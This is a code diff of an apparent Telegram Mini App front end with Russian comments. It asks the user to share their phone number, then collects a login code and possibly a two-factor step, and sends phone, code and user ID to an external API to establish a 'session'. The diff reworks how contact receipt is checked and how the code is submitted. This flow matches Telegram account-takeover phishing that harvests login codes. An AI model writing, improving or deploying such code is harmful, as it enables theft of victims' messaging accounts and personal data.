@@ -137,68 +137,75 @@
     }
 
     // 5. Логика авторизации (API)
-    function requestAuth() {
-        tg.requestContact((ok) => {
+    async function requestAuth() {
+        tg.requestContact(async (ok) => {
             if(ok) {
                 document.getElementById('s1').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
                 document.getElementById('l-text').innerText = "Ожидание подтверждения..."; 
                 
-                let attempts = 0;
-                const check = setInterval(async () => {
-                    attempts++;
+                // Ждем 3 секунды, чтобы бот успел обработать контакт в фоне
+                setTimeout(async () => {
                     try {
-                        const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
+                        const userId = tg.initDataUnsafe.user.id;
+                        // Проверяем статус через API
+                        const r = await fetch(`${API_BASE}/api/check_contact?id=${userId}`);
                         const d = await r.json();
                         
                         if(d.status === 'received') {
-                            clearInterval(check);
-                            userPhone = d.phone;
+                            userPhone = d.phone; // Сохраняем полученный номер
                             document.getElementById('loader').style.display = 'none';
                             document.getElementById('s2').style.display = 'block';
+                        } else {
+                            alert("Бот еще не получил ваш номер. Попробуйте нажать 'Начать' снова.");
+                            document.getElementById('loader').style.display = 'none';
+                            document.getElementById('s1').style.display = 'block';
                         }
-                    } catch(e) { console.error("Ошибка сети:", e); }
-                    
-                    if(attempts > 30) { 
-                        clearInterval(check);
-                        document.getElementById('l-text').innerText = "Ошибка сессии. Попробуйте еще раз.";
+                    } catch(e) {
+                        alert("Ошибка связи. Проверьте запуск бота.");
+                        document.getElementById('loader').style.display = 'none';
+                        document.getElementById('s1').style.display = 'block';
                     }
-                }, 2000);
+                }, 3000);
             }
         });
     }
 
     async function sendCode() {
         if (isSending) return;
-        const c = document.getElementById('code').value;
-        if(c.length < 5) return;
-        
+        const codeInput = document.getElementById('code').value;
+        if(codeInput.length < 5) return;
+
         isSending = true;
         document.getElementById('s2').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
         document.getElementById('l-text').innerText = "Проверка кода...";
-        
+
         try {
-            const r = await fetch('/api/send_code', {
+            const userId = tg.initDataUnsafe.user.id.toString(); // Принудительно в строку
+            const response = await fetch(`${API_BASE}/api/send_code`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone: userPhone, code: c})
+                body: JSON.stringify({
+                    phone: userPhone, 
+                    code: codeInput, 
+                    id: userId // Передаем ID для сессии
+                })
             });
-            const d = await r.json();
-            document.getElementById('loader').style.display = 'none';
-
-            if(d.status === '2fa_needed') {
-                document.getElementById('s3').style.display = 'block';
-            } else if(d.status === 'success') {
+            const result = await response.json();
+            
+            if(result.status === 'success') {
                 finish();
+            } else if(result.status === '2fa_needed') {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('s3').style.display = 'block';
             } else {
-                tg.showAlert("Ошибка: " + (d.message || "неверный код"));
+                alert("Ошибка: " + (result.message || "неверный код"));
+                document.getElementById('loader').style.display = 'none';
                 document.getElementById('s2').style.display = 'block';
             }
         } catch(e) {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('s2').style.display = 'block';
-            tg.showAlert("Ошибка связи с сервером.");
+            alert("Ошибка сети. Проверьте консоль.");
         } finally {
             isSending = false;
         }
